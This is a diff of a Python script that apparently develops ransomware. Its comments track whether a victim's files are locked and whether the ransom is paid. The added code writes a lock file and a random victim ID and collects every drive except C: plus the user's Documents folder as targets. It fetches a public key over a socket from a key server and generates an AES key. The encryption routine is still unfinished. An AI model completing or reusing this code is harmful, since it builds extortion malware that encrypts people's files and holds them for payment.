@@ -1,12 +1,16 @@
 import os
 import json
 import string
+import random
+import hashlib
+import socket
+import secrets
 
 __rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
 testPath = "./data/"
 
 def checkfile():
-    rmfilePath = testPath + "a.json"
+    rmfilePath = testPath + "lock.json"
     
     #0:沒檔案or未加密,1:有檔案未繳錢,2:有檔案已繳錢
     try:
@@ -19,16 +23,28 @@ def checkfile():
                 return 1
             elif(data["lock"] == 1 and data["paid"] == 1):
                 return 2
-    except FileExistsError:
+    except FileNotFoundError:
         print("No found")
         return 0
 
 def __createCheckfile():
-    rmfilePath = testPath + "b.json"
+    rmfilePath = testPath + "lock.json"
     data = {
         "lock":1,
-        "paid":0
+        "paid":0,
         }
+    with open(rmfilePath,"w") as file:
+        json.dump(data,file,indent=4)
+
+def __createRandomID(length=16):
+    letters_and_digits = string.ascii_letters + string.digits
+    random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
+    id = hashlib.sha256(random_string.encode()).hexdigest()
+
+    rmfilePath = testPath + "id.json"
+    data = {
+        "id":id
+    }
     with open(rmfilePath,"w") as file:
         json.dump(data,file,indent=4)
 
@@ -39,13 +55,45 @@ def _getAvaiblableDrives():
         if os.path.exists(drive):
             drives.append(drive)
     drives.remove("C:/")
+    drives.append(f"C:/Users/{os.getlogin()}/Documents")
     return drives
 
+def __Encryprion(path):
+    def __getPublicKey():
+        recevice = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        recevice.connect(("localhost",8888))
+        publicKey = recevice.recv(4096)
+        return publicKey
+    
+    def __generateAESKey(key_length=16):
+        key = secrets.token_bytes(key_length)
+        key = key.hex()
+        return key
+
+    encryptFilePath = []
+    publicKey = __getPublicKey()
+    aeskey = __generateAESKey(32)
+
+    
+
 def runEncryption():
-    print("加密開始")
+    print("Encryption start")
     __createCheckfile()
+    __createRandomID()
     drives = _getAvaiblableDrives()
+    print(drives)
+
+    __Encryprion(drives)
+    
 
 
 def rundeCryption():
-    print("解密開始")
+    print("Decryption start")
+    rmfilePath = testPath + "lock.json"
+    
+    with open(rmfilePath,"r") as file:
+        data = json.load(file)
+    data["paid"] = 1
+
+    with open(rmfilePath,"w") as file:
+        json.dump(data,file,indent=4)
